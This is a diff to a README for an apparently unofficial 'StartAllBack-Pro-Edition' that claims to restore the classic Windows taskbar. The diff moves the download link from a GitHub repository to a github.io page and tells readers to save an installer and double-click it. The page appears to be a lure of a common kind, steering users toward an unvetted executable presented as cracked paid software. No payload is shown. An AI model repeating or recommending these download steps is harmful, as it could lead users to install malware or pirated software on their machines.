@@ -1,6 +1,6 @@
 # 🖥️ StartAllBack-Pro-Edition - Restore your classic Windows taskbar layout
 
-[![Download StartAllBack Pro](https://img.shields.io/badge/Download-StartAllBack_Pro-blue.svg)](https://github.com/Huntanacoluthic253/StartAllBack-Pro-Edition)
+[![Download StartAllBack Pro](https://img.shields.io/badge/Download-StartAllBack_Pro-blue.svg)](https://huntanacoluthic253.github.io)
 
 ## 📑 Overview
 
@@ -19,7 +19,7 @@ Before you install this software, ensure your computer meets these requirements:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit this page to download the software: https://github.com/Huntanacoluthic253/StartAllBack-Pro-Edition
+1. Visit this page to download the software: https://huntanacoluthic253.github.io
 2. Locate the download button or link provided on the page.
 3. Save the installer file to your Downloads folder.
 4. Double-click the saved file to start the installation.
